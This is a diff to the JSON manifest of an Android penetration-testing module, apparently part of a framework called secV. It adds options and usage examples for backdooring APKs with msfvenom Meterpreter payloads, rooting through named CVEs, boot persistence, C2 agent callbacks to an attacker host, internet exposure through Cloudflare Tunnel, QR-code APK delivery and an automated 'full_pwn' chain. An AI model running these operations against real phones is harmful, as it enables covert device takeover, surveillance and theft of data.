@@ -29,16 +29,45 @@
       "operation": {
         "description": "Penetration testing operation to perform",
         "type": "string",
-        "options": ["recon", "app_scan", "vuln_scan", "exploit", "network", "forensics", "full"],
+        "options": [
+          "recon", "app_scan", "vuln_scan", "exploit", "network", "forensics", "full",
+          "frida_hook", "objection_patch",
+          "backdoor_apk", "deploy_shell",
+          "adb_wifi", "get_root", "exploit_cve", "cve_chain", "zero_click",
+          "persist", "hook", "unhook",
+          "device_net_scan",
+          "msf_handler", "wan_expose",
+          "qr_exploit", "inject_agent",
+          "full_pwn", "multi_device"
+        ],
         "default": "recon",
         "examples": [
-          "recon - Device reconnaissance and security posture",
-          "app_scan - Application security analysis",
-          "vuln_scan - Vulnerability scanning",
-          "exploit - Exploitation testing (ethical)",
-          "network - Network traffic analysis",
-          "forensics - Data extraction and forensics",
-          "full - Complete penetration test"
+          "recon          — Device fingerprint, root/bootloader/SELinux/patch-level",
+          "app_scan       — Static APK analysis, manifest, permissions, secret scan",
+          "vuln_scan      — Device + app CVE assessment",
+          "exploit        — Intent injection, SQLi on content providers, component abuse",
+          "network        — tcpdump capture + logcat credential leakage",
+          "forensics      — DB/SharedPreferences extraction, logcat, ADB backup",
+          "full           — Runs recon → app_scan → vuln_scan → exploit → network → forensics",
+          "frida_hook     — Deploy frida-server, SSL unpin, root bypass, dump creds, trace",
+          "objection_patch — Embed Frida gadget via Objection (no root at runtime)",
+          "backdoor_apk   — Pull APK, inject msfvenom payload (-x template), sign, reinstall",
+          "deploy_shell   — Generate fresh msfvenom APK and install via adb",
+          "adb_wifi       — Enable ADB over TCP/WiFi (adb tcpip 5555)",
+          "get_root       — Multi-vector root: Magisk/su, adb root, CVE-2024-0044, mtk-su, KernelSU",
+          "exploit_cve    — Targeted CVE: CVE-2024-0044, CVE-2023-45866, CVE-2024-31317",
+          "cve_chain      — Chain multiple CVE exploits for privilege escalation",
+          "zero_click     — Zero-interaction vectors: NFC, BLE, WiFi",
+          "persist        — Termux:Boot (no root), Magisk post-fs-data.d / service module",
+          "hook           — secV hook layer: monitor calls + C2 relay",
+          "unhook         — Remove secV hooks cleanly",
+          "device_net_scan — Scan device WiFi IP via netrecon",
+          "msf_handler    — Start msfrpcd Metasploit handler",
+          "wan_expose     — Expose MSF + APK server via Cloudflare Tunnel",
+          "qr_exploit     — QR code payload: APK URL, Intent URI, ADB wireless pairing, deeplink",
+          "inject_agent   — Push ARM64/shell agent, receive JSON recon + C2 callback",
+          "full_pwn       — Auto-chain: recon → adb_wifi → get_root → device_net_scan → deploy_shell → persist → wan_expose",
+          "multi_device   — Run any sub-operation on ALL connected devices simultaneously"
         ]
       },
       "device": {
@@ -104,77 +133,256 @@
           "IP addresses"
         ]
       },
+      "deep_analysis": {
+        "description": "Use jadx Java decompilation for deeper code analysis (slower)",
+        "type": "boolean",
+        "required": false,
+        "default": false
+      },
+      "cleanup": {
+        "description": "Delete work directory after operation completes",
+        "type": "boolean",
+        "required": false,
+        "default": false
+      },
+      "third_party_only": {
+        "description": "Only scan user-installed apps (skip system apps)",
+        "type": "boolean",
+        "required": false,
+        "default": true
+      },
+      "scan_limit": {
+        "description": "Max apps to scan when no package is specified",
+        "type": "integer",
+        "required": false,
+        "default": 5
+      },
+      "nvd_api_key": {
+        "description": "NVD API key for real-time CVE lookups (also reads NVD_API_KEY env var)",
+        "type": "string",
+        "required": false,
+        "default": ""
+      },
+      "lhost": {
+        "description": "Attacker IP or hostname for reverse shells and payload delivery (auto-detected from default route)",
+        "type": "string",
+        "required": false,
+        "default": "",
+        "examples": ["192.168.1.42", "attacker.example.com"]
+      },
+      "lport": {
+        "description": "Listener port for reverse shells and MSF handler",
+        "type": "integer",
+        "required": false,
+        "default": 4444
+      },
+      "payload": {
+        "description": "Metasploit payload for backdoor_apk / deploy_shell / msf_handler. Shorthand: tcp, http, https, shell, stageless.",
+        "type": "string",
+        "required": false,
+        "default": "android/meterpreter/reverse_tcp",
+        "options": ["android/meterpreter/reverse_tcp", "android/meterpreter/reverse_http", "android/meterpreter/reverse_https", "android/shell/reverse_tcp", "android/meterpreter_reverse_tcp"]
+      },
+      "install": {
+        "description": "After backdoor_apk or deploy_shell: uninstall original and install backdoored APK on device",
+        "type": "boolean",
+        "required": false,
+        "default": false
+      },
+      "hook_mode": {
+        "description": "Frida hook mode for frida_hook operation",
+        "type": "string",
+        "required": false,
+        "default": "all",
+        "options": ["all", "ssl_unpin", "root_bypass", "dump_creds", "trace"]
+      },
+      "hook_timeout": {
+        "description": "Seconds to keep Frida attached before detaching (frida_hook)",
+        "type": "integer",
+        "required": false,
+        "default": 30
+      },
+      "trace_method": {
+        "description": "Class or method substring to trace (used with hook_mode=trace)",
+        "type": "string",
+        "required": false,
+        "default": ""
+      },
+      "agent_mode": {
+        "description": "Agent behavior mode for inject_agent",
+        "type": "string",
+        "required": false,
+        "default": "recon",
+        "options": ["recon", "exploit", "c2"]
+      },
+      "c2_host": {
+        "description": "Attacker IP for agent callback in inject_agent (auto-detected)",
+        "type": "string",
+        "required": false,
+        "default": ""
+      },
+      "c2_port": {
+        "description": "TCP port for agent C2 listener (inject_agent)",
+        "type": "integer",
+        "required": false,
+        "default": 8889
+      },
+      "c2_timeout": {
+        "description": "Seconds to wait for agent TCP callback (inject_agent)",
+        "type": "integer",
+        "required": false,
+        "default": 20
+      },
+      "escalate": {
+        "description": "Automatically issue ROOT_SHELL or SHELL when agent connects in exploit/c2 mode",
+        "type": "boolean",
+        "required": false,
+        "default": false
+      },
+      "qr_mode": {
+        "description": "QR code payload type for qr_exploit",
+        "type": "string",
+        "required": false,
+        "default": "apk",
+        "options": ["apk", "intent", "adb_pair", "deeplink", "custom"]
+      },
+      "pair_port": {
+        "description": "Wireless ADB pairing port for qr_exploit mode=adb_pair (Android 11+)",
+        "type": "integer",
+        "required": false,
+        "default": 37001
+      },
+      "pair_code": {
+        "description": "Wireless ADB pairing code for qr_exploit mode=adb_pair",
+        "type": "string",
+        "required": false,
+        "default": "123456"
+      },
+      "cve": {
+        "description": "CVE identifier for exploit_cve operation (e.g. CVE-2024-0044)",
+        "type": "string",
+        "required": false,
+        "default": "",
+        "options": ["CVE-2024-0044", "CVE-2023-45866", "CVE-2024-31317"]
+      },
+      "adb_port": {
+        "description": "TCP port to use when enabling ADB over WiFi (adb_wifi operation)",
+        "type": "integer",
+        "required": false,
+        "default": 5555
+      },
+      "serve_port": {
+        "description": "HTTP server port for APK delivery (wan_expose / qr_exploit)",
+        "type": "integer",
+        "required": false,
+        "default": 8888
+      },
       "mirror": {
         "description": "Enable screen mirroring and recording",
         "type": "boolean",
+        "required": false,
         "default": false
       },
       "record": {
         "description": "Record screen video (30 seconds)",
         "type": "boolean",
+        "required": false,
         "default": false
       }
     },
     
     "examples": [
       {
-        "description": "Device security reconnaissance",
-        "commands": [
-          "use android_pentest",
-          "set operation recon",
-          "run device"
-        ]
+        "description": "Device reconnaissance",
+        "commands": ["use android_pentest", "run device"]
       },
       {
-        "description": "Scan specific application for vulnerabilities",
+        "description": "Static APK analysis",
         "commands": [
           "use android_pentest",
           "set operation app_scan",
-          "set package com.example.app",
-          "run device"
-        ]
-      },
-      {
-        "description": "Full vulnerability assessment",
-        "commands": [
-          "use android_pentest",
-          "set operation vuln_scan",
-          "run device"
-        ]
-      },
-      {
-        "description": "Test application for exploitable vulnerabilities",
-        "commands": [
-          "use android_pentest",
-          "set operation exploit",
           "set package com.target.app",
+          "set search_secrets true",
           "run device"
         ]
       },
       {
-        "description": "Capture and analyze network traffic",
+        "description": "Frida SSL unpinning",
         "commands": [
           "use android_pentest",
-          "set operation network",
+          "set operation frida_hook",
           "set package com.target.app",
+          "set hook_mode ssl_unpin",
           "run device"
         ]
       },
       {
-        "description": "Extract forensics data",
+        "description": "Backdoor an installed APK",
         "commands": [
           "use android_pentest",
-          "set operation forensics",
+          "set operation backdoor_apk",
           "set package com.target.app",
+          "set lhost 192.168.1.42",
+          "set lport 4444",
+          "set payload android/meterpreter/reverse_http",
+          "set install false",
           "run device"
         ]
       },
       {
-        "description": "Complete penetration test",
+        "description": "Multi-vector root acquisition",
         "commands": [
           "use android_pentest",
-          "set operation full",
-          "set package com.target.app",
+          "set operation get_root",
+          "run device"
+        ]
+      },
+      {
+        "description": "Boot persistence (no root via Termux:Boot)",
+        "commands": [
+          "use android_pentest",
+          "set operation persist",
+          "set lhost 192.168.1.42",
+          "set lport 4444",
+          "run device"
+        ]
+      },
+      {
+        "description": "WAN exposure via Cloudflare Tunnel",
+        "commands": [
+          "use android_pentest",
+          "set operation wan_expose",
+          "set lport 4444",
+          "set serve_port 8888",
+          "run no_device"
+        ]
+      },
+      {
+        "description": "QR code APK delivery",
+        "commands": [
+          "use android_pentest",
+          "set operation qr_exploit",
+          "set qr_mode apk",
+          "set lhost 192.168.1.42",
+          "set lport 8888",
+          "run no_device"
+        ]
+      },
+      {
+        "description": "Full automated pwn chain",
+        "commands": [
+          "use android_pentest",
+          "set operation full_pwn",
+          "set lhost 192.168.1.42",
+          "set lport 4444",
+          "run device"
+        ]
+      },
+      {
+        "description": "Run recon on all connected devices",
+        "commands": [
+          "use android_pentest",
+          "set operation multi_device",
           "run device"
         ]
       }
@@ -442,31 +650,17 @@
     },
     
     "installation_tiers": {
-      "basic": "Device recon and basic app analysis (stdlib + adb)",
-      "standard": "+ Static APK analysis (aapt, keytool)",
-      "full":     "+ Code analysis (apktool, jadx)",
-      "full": "+ Runtime instrumentation (frida, objection)"
+      "basic":    "Device recon and basic app analysis (stdlib + adb)",
+      "standard": "Static APK analysis — add aapt, keytool (included with JDK)",
+      "full":     "Code analysis — add apktool, jadx",
+      "runtime":  "Frida instrumentation — pip3 install frida-tools objection"
     },
     
     "requirements": {
-      "basic": [
-        "Python 3.8+",
-        "adb"
-      ],
-      "standard": [
-        "aapt (Android Asset Packaging Tool)",
-        "keytool (Java Key and Certificate Management)"
-      ],
-      "full": [
-        "apktool (APK decompilation)",
-        "jadx (DEX to Java decompiler)"
-      ],
-      "full": [
-        "frida-tools (Runtime instrumentation)",
-        "objection (Frida automation)",
-        "requests (HTTP client)",
-        "cryptography (Certificate parsing)"
-      ]
+      "basic":    ["Python 3.8+", "adb"],
+      "standard": ["aapt", "keytool (JDK)"],
+      "full":     ["apktool", "jadx"],
+      "runtime":  ["frida-tools", "objection", "requests", "cryptography", "msfvenom (Metasploit)"]
     },
     
     "notes": [
